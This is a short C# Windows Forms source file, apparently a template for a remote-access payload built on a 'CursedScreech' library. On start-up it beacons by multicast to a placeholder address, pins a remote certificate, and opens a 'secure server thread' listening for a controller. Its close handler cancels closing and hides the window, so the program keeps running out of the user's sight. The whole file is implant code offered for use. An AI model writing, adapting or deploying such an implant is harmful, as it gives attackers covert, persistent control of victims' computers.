using System;
using System.Drawing;
using System.Windows.Forms;
using CursedScreech;

namespace Payload
{
    public partial class Form1 : Form {

        public Form1() {
            InitializeComponent();
            
			CursedScreech.CursedScreech cs = new CursedScreech.CursedScreech();
            cs.startMulticaster("IPAddress", mcastport, hbinterval);
            cs.setRemoteCertificateSerial("serial");
            cs.setRemoteCertificateHash("fingerprint");
            cs.startSecureServerThread("privateKey", "password");
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            e.Cancel = true;
            this.Hide();
        }
    }
}